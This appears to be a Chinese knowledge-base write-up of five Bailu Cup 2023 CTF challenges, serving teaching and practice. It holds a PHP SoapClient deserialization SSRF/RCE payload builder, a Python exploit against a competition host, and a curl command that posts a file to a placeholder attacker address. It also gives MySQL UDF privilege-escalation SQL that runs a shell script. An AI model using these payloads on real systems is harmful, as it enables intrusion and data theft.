---
title: 白鹭杯 CTF 2023 全题型 Writeup
description: 白鹭杯 CTF 竞赛完整解题报告，涵盖 EZ_PHP（SoapClient 反序列化 SSRF/RCE）、so_easy（MySQL UDF
  提权）、签到、大数据分解（RSA 多段密文解密）、蜜雪冰城？（条形码修复 + Unicode 零宽隐写 + 音频键盘音密码）五道题目的详细复现与分析。
category: program-analysis
tags:
- 白鹭杯
- CTF
- Writeup
- PHP反序列化
- SoapClient
- SSRF
- MySQL UDF
- RSA
- 条形码修复
- 零宽隐写
- 音频分析
date: '2023-04-16'
updated: '2026-11-15'
---
## 概述

本页面整理白鹭杯 CTF 2023 竞赛的全题型 Writeup，共五道题目，涉及 Web、Pwn、Crypto、Misc 多个方向。每题包含核心技术点分析、利用链构造、关键脚本与实战截图，旨在为 CTF 选手提供可复现的完整解题思路。

## EZ_PHP —— SoapClient 反序列化 SSRF/RCE

### 题目信息
- **考点**：PHP `SoapClient` 反序列化触发 SSRF，结合 `phar://` 伪协议或内网服务交互实现 RCE
- **难度**：中等

### 核心原理
`SoapClient` 在反序列化时会自动发起 HTTP 请求至 `uri` 和 `location` 指定的地址。若可控反序列化入口，可构造恶意 `SoapClient` 对象，向内网目标发送携带 PHP 代码的请求，配合 `assert`/`passthru` 等函数执行系统命令。

> 交叉引用：[[php伪协议与反序列化利用]] 中 `__wakeup` 绕过与伪协议利用技巧；[[ssrf-bypass-techniques]] 中 `gopher://`/`http://` 协议攻击内网服务实战。

### 利用链构造
1. **生成恶意序列化字符串**  
   使用 PHP 脚本构造 `SoapClient` 对象，`uri` 与 `location` 指向内网 `flag.php`，参数 `i` 携带经过取反 URL 编码的命令执行代码：
   ```php
   $system = "assert";   // 或 "passthru"
   $command = "echo `php -r 'phpinfo();'` > /home/www-data/res1.txt";
   $cc = '(~'.urlencode(~$system).')(~'.urlencode(~$command).');';
   $url = "http://127.0.0.1/flag.php?i=".$cc;
   $b = new SoapClient(null, ['uri' => $url, 'location' => $url]);
   $a = serialize($b);
   $a = str_replace('^^', "\r\n", $a);  // 修复序列化字符串中的换行
   echo "|" . urlencode($a);
   ```
2. **植入 Session**  
   目标站点存在 `session_start` 与 `extract` 两个功能点，先通过 `f=session_start` 写入恶意序列化数据至 Session，再通过 `f=extract` 触发反序列化。
3. **命令回显**  
   执行 `php -r 'phpinfo();'` 结果写入 `/home/www-data/res1.txt`，再通过 `curl -d @/home/www-data/res1.txt http://attacker_ip:port` 带出。

### 关键 Exp（Python 自动化）
```python
import requests
session = requests.session()
cookie = {"Cookie": "PHPSESSID=toadttjiang34234sdf2345234234345"}
url = "http://8.130.170.42:15294/index.php?f=session_start&name=|O%3A10%3A%22SoapClient%22%3A3%3A%7B...%7D"  # URL编码后的序列化字符串
url1 = "http://8.130.170.42:15294/index.php?f=extract&name=SoapClient"
data1 = {'serialize_handler': 'php_serialize'}
data2 = {"b": "call_user_func"}
session.post(url, data=data1, cookies=cookie, proxies={"http": None})
session.post(url1, data=data2, cookies=cookie, proxies={"http": None})
```

### 实战截图
![命令执行结果写入文件](../Images/b33bbf54abbc999df909b8bf8c0df057.png)  
![获取 Flag](../Images/33ca9aebbc4d319646c99b51968ab207.png)

---

## so_easy —— MySQL UDF 提权

### 题目信息
- **考点**：MySQL `root` 权限写入 UDF 动态库实现提权
- **难度**：中等

### 核心原理
MySQL 以 `root` 运行且开启 `secure_file_priv` 允许写入插件目录时，可上传预编译的 UDF `.so`（Linux）或 `.dll`（Windows）文件，通过 `CREATE FUNCTION` 注册系统命令执行函数（如 `sys_exec`、`sys_eval`），从而获得操作系统 Shell。

> 交叉引用：[[mysql-dnslog-injection-loadfile-unc]] 中 `load_file()` 与 UDF 结合的数据外带思路；实战渗透中常配合 [[cobalt-strike-external-c2-smb-beacon]] 落地长期控制。

### 利用流程
1. **确认权限与路径**  
   ```sql
   SELECT @@version_compile_os, @@plugin_dir, @@secure_file_priv;
   ```
2. **上传 UDF 文件**  
   将 `lib_mysqludf_sys.so` 写入 `@@plugin_dir`（如 `/usr/lib/mysql/plugin/`）。
3. **注册函数并执行命令**  
   ```sql
   CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
   SELECT sys_exec('chmod +x /tmp/shell.sh && /tmp/shell.sh');
   ```
4. **反弹 Shell / 写入 Webshell**  
   结合 Web 目录写入权限，落地 PHP/Webshell 实现持久化。

### 参考资源
- [SSRF 攻击 MySQL UDF 提权详解](https://coomrade.github.io/2018/10/28/SSRF%E6%94%BB%E5%87%BBMySQL/)

### 实战截图
![UDF 提权过程](../Images/e0b9e1bd0f2e7c2caf341b39bcc678b3.png)

---

## 签到

### 题目信息
- **考点**：基础信息收集 / 未授权访问
- **难度**：入门

### 解题过程
直接访问题目给出的端口：
```bash
curl http://8.130.170.42:8889
```
返回 Flag。

### 实战截图
![签到 Flag](../Images/0e20d8890152ee2ad217095bbdd8e602.png)

---

## 大数据分解 —— RSA 多段密文解密

### 题目信息
- **考点**：RSA 已知 `p`、`q` 解密多段 Base64 密文
- **难度**：中等

### 核心原理
给定公钥文件 `public.pem` 与四段 Base64 编码的密文 `flag.enc1~4`，且已知大素数 `p`、`q`。通过计算 `phi = (p-1)*(q-1)`、私钥指数 `d = e^{-1} mod phi`，逐段解密并拼接。

> 交叉引用：[[crypto-basics-xor-stream-cipher-tutorial]] 中基础密码学原理与 Python 实现技巧。

### 解密脚本
```python
from gmpy2 import invert
from base64 import b64decode, b16decode
from Crypto.Util.number import *
from Crypto.PublicKey import RSA

with open("public.pem","rb") as f:
    rsakey = RSA.importKey(f.read())
    n = rsakey.n
    e = rsakey.e

p = 948539437740472240970258995719507356652939947
q = 1033916782753483187367063564275935620987269651
phi = (p-1)*(q-1)
d = int(invert(e, phi))

# 读取四段密文
cipher1 = bytes_to_long(b64decode(open("flag.enc1","rb").read()))
cipher2 = bytes_to_long(b64decode(open("flag.enc2","rb").read()))
cipher3 = bytes_to_long(b64decode(open("flag.enc3","rb").read()))
cipher4 = bytes_to_long(b64decode(open("flag.enc4","rb").read()))

# 解密并取尾部有效字节
part1 = long_to_bytes(pow(cipher1, d, n))[-22:]
part2 = long_to_bytes(pow(cipher2, d, n))[-22:]
part3 = long_to_bytes(pow(cipher3, d, n))[-22:]
part4 = long_to_bytes(pow(cipher4, d, n))[-20:]

# 拼接并 Base16 解码
flag = b16decode((part1+part2+part3+part4).upper())
print(flag)
```

### 实战截图
![运行脚本获得 Flag](../Images/010bcea3e73b931a58201db46f578f6f.png)

---

## 蜜雪冰城？ —— 条形码修复 + Unicode 零宽隐写 + 音频键盘音密码

### 题目信息
- **考点**：Misc 综合：图像修复、零宽字符隐写、音频频谱/键盘音分析
- **难度**：较高

### 解题全链路

#### 条形码修复与解码
题目图片中二维码/条形码被遮挡，需手工修复（PS/在线工具补全定位图案、纠错块）。修复后使用在线解码器：
> https://online-barcode-reader.inliteresearch.com/
解码得到数字串：**8521457896541**（作为后续压缩包密码）。

![条形码解码结果](../Images/676e03ac95c2b96bb2fed50e9a1e3f48.png)

#### Unicode 零宽隐写提取
附件 `蜜雪冰城？！.txt` 使用 `vim` / `xxd` 查看，发现大量 `<200d>` (ZERO WIDTH JOINER)、`<200c>` (ZERO WIDTH NON-JOINER) 等零宽字符。

使用在线工具提取隐藏数据：
> http://330k.github.io/misc_tools/unicode_steganography.html
选择对应零宽字符集，解码并下载二进制文件。

![零宽隐写解码](../Images/2805fe7ccf353a1fe7e24c995895a96d.png)

#### 音频文件识别与键盘音分析
`hexdump` 查看提取文件头，特征 `ID3` / `MP3` 帧头，改后缀为 `.mp3`。

![Hexdump 确认 MP3](../Images/0abc6a1054066bf8469a4f4b561a5780.png)

播放音频，为《蜜雪冰城》主题曲键盘音（按键音对应数字键盘频率）。人工或脚本（DTMF 解码 / 频谱峰值匹配）还原按键序列：
**399#9311233212** —— 即为压缩包解压密码。

#### 解压获取 Flag
使用条形码密码 `8521457896541` 解压第一层，再用键盘音密码 `399#9311233212` 解压第二层，得到最终 Flag。

### 实战截图
![压缩包解压成功](../Images/fbe6be5176e01acdbae4f7eb6835e9bd.png)

---

## 知识点总结与延伸

| 题目 | 核心技术 | 关联知识库页面 |
|------|----------|----------------|
| EZ_PHP | PHP 反序列化、SoapClient SSRF、伪协议绕过 | [[php伪协议与反序列化利用]]、[[ssrf-bypass-techniques]]、[[ssrf-ctf-exploitation-guide]] |
| so_easy | MySQL UDF 提权、插件目录写入 | [[mysql-dnslog-injection-loadfile-unc]] |
| 签到 | 信息收集、未授权访问 | — |
| 大数据分解 | RSA 多段解密、已知 p/q 推导私钥 | [[crypto-basics-xor-stream-cipher-tutorial]] |
| 蜜雪冰城？ | 条形码修复、零宽隐写、DTMF/键盘音分析 | — |

> 💡 **实战建议**：  
> - Web 方向重点积累 **反序列化 Gadget 链**、**SSRF 协议利用**、**Session 伪造** 等高频考点；  
> - Crypto 方向熟练掌握 **RSA 常见攻击**（小指数、共模、已知 p/q、故障注入）及 Python `gmpy2`/`pycryptodome` 库用法；  
> - Misc 方向建立 **图像修复**、**隐写提取工具链**（zsteg、stegsolve、零宽字符在线工具）、**音频频谱分析**（Audacity、DTMF 脚本）的标准化流程。

---

## 参考资料
1. 白鹭杯官方 Writeup / 赛后复盘文章（微信公众号归档）  
2. [SoapClient SSRF 利用技巧总结](https://www.anquanke.com/post/id/195521)  
3. [MySQL UDF 提权实战](https://coomrade.github.io/2018/10/28/SSRF%E6%94%BB%E5%87%BBMySQL/)  
4. [Unicode 零宽隐写原理与工具](http://330k.github.io/misc_tools/unicode_steganography.html)  
5. [DTMF 键盘音频频率对照表](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling)  

---  
*页面维护者：知识库策展人 | 最后更新：2023-04-16*

## 来源

- [0xfafu攻防实验室-202010-202112_06](../sources/0xfafu攻防实验室-202010-202112_06.md)
